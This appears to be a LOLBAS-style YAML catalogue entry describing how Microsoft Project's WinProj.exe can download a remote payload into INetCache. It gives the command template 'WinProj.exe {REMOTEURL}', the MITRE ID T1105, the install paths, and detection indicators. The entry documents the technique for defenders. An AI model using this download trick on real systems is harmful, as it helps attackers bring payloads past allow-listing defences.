---
Name: WinProj.exe
Description: Microsoft Project Executable
Author: Avihay Eldad
Created: 2024-02-14
Commands:
  - Command: WinProj.exe {REMOTEURL}
    Description: Downloads payload from remote server
    Usecase: It will download a remote payload and place it in INetCache.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
    Tags:
      - Download: INetCache
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\Office14\WinProj.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\Office15\WinProj.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\Office16\WinProj.exe
  - Path: C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\root\Office14\WinProj.exe
  - Path: C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\root\Office15\WinProj.exe
  - Path: C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe
  - Path: C:\Program Files\Microsoft Office\root\Office16\WinProj.exe
Detection:
  - IOC: URL on a WinProj command line
  - IOC: WinProj making unexpected network connections or DNS requests
Acknowledgement:
  - Person: Avihay Eldad
    Handle: '@AvihayEldad'
---
